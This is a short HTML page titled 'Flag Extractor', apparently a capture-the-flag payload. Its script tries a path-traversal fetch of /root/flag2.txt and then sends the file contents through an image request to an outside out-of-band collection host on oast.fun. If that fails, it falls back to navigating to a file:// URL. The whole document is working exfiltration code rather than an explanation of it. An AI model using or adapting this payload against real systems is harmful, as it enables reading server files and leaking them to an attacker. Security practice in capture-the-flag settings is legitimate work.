<!DOCTYPE html>
<html>
<head>
    <title>Flag Extractor</title>
</head>
<body>
    <script>
        // First, try to request the flag with a path traversal
        fetch('/../../root/flag2.txt')
            .then(response => response.text())
            .then(data => {
                const img = new Image();
                img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?flag=" + encodeURIComponent(data);
                document.body.appendChild(img);
            })
            .catch(err => {
                console.error(err);
                // Try alternative if the first approach fails
                location.href = "file:///root/flag2.txt";
            });
    </script>
</body>
</html>
